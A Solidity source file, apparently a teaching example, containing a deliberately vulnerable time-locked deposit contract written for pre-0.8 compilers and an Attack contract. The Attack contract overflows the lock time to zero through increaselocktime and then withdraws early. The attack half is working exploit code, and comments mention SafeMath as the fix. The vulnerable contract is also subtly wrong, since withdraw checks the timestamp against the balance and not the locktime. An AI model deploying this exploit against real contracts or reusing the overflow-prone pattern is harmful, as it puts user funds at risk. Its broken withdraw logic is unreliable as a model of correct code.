// SPDX-License-Identifier: MIT

pragma solidity ^0.7.6; 

// Solidity < 0.8
// Integers in Solidity overflow / underflow without any errors

// Solidity >= 0.8
// Default behaviour of Solidity 0.8 for overflow / underflow is to throw an error.


contract OverFlowandUnderFlow
{

     mapping(address=>uint256) public balances;
     mapping(address=>uint256) public locktime;

     function deposit() public payable
     {
        balances[msg.sender]+=msg.value;
        locktime[msg.sender]+=block.timestamp + 1 weeks;
     }

     function increaselocktime(uint256 _increaselocktime) public
     {
        locktime[msg.sender]+=_increaselocktime; // to  prevent this hack we need to use .add() function from SafeMath Library so that it insists there is a overflow
     }

     function withdraw() public 
     {
       require(balances[msg.sender]>0,"No balance in your account");
       require(block.timestamp>balances[msg.sender],"time didnot complete to withdraw");

       uint256 amount = balances[msg.sender];
       balances[msg.sender] = 0;

       (bool result , ) = payable(msg.sender).call{value:amount}("");
       require(result,"Ether not sent");
     }

     function getbalance() public view returns(uint256)
     {
         return address(this).balance;
     }





}

contract Attack
{

   OverFlowandUnderFlow public overflowandunderflow ;

   constructor(address _overflowandunderflow)
   {
       overflowandunderflow = OverFlowandUnderFlow(_overflowandunderflow);
   }

   function attack() public payable
   {
       overflowandunderflow.deposit{value:1 ether}();
       overflowandunderflow.increaselocktime(
           uint256(-overflowandunderflow.locktime(address(this))));
       overflowandunderflow.withdraw();

   }

   function getbalance() public view returns(uint256)
   {
       return address(this).balance;
   }

}
